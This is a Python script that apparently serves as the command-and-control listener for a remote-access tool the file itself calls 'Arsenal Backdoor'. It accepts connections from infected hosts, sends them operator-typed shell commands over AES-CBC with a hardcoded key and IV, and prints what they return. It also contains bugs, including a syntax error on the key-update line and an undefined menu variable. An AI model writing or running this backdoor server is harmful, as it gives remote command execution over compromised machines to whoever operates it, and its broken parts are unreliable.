#!/usr/bin/python3
import socket, sys, os, argparse, subprocess, struct
from _thread import start_new_thread
from Crypto.Cipher import AES
parser = argparse.ArgumentParser(description='q*bert says goodbye')
parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
parser.add_argument('-s', dest='host', help='Hosting IP')
args = parser.parse_args()
aeskey = 'This is a key123'
aesiv = 'This is an IV456'

if args.host is None:
    args.host = '0.0.0.0'

def update_aeskeys(key, iv):
    global aeskey, aesiv
    aeskey = key
    aesiv = iv
    return 'aeskey ' + key + ' ' + iv

def do_encrypt(message):
    if isinstance(message, bytes):
        pass
    else:
        message = bytes(message, 'utf-8')
    length = 16 - (len(message) % 16)
    message += bytes([length])*length
    obj = AES.new(aeskey, AES.MODE_CBC, aesiv)
    cipher = obj.encrypt(message)
    return cipher

def do_decrypt(ciphertext):
    obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
    message = obj2.decrypt(ciphertext)
    return message[:-message[-1]]

def client(conn, addr, buff):
    conn.send(do_encrypt('Arsenal Backdoor'))
    while True:
        holder = []
        bs = conn.recv(8)
        try:
            (length,) = struct.unpack('>Q', bs)
        except struct.error as err:
            print("{0}".format(err))
            break
        data = b''
        while len(data) < length:
            to_read = length - len(data)
            data += conn.recv(buff if to_read > buff else to_read)
        print(addr[0]+':\n'+str(do_decrypt(data).strip(), 'utf-8'))
        while True:
            try:
                reply=input('Enter command for %s: ' %addr[0])
            except ValueError:
                print("Bad input")
            if "update_key" in reply:
                conn.send(do_encrypt(update_aeskeys(reply[1],reply[2]))
            if reply == '':
                continue
            else:
                conn.send(do_encrypt('cmd ' + reply))
                break
        if not data:
            break
    conn.close()
    print("\nClosed connection from %s:%s" %(addr[0],addr[1]))

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    s.bind((args.host, args.port))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        print("Connection received from %s:%s" %(addr[0], addr[1]))
        try:
            start_new_thread(client, (conn, addr, buff))
        except socket.error:
            sys.stderr.write("[Error] %s\n" %socket.error.msg[1])
        except KeyboardInterrupt:
            print('[-] Server shutting down...')
            break

def draw_screen():
    global menu
    os.system('clear')
    print(menu)


if __name__ == '__main__':
    main()
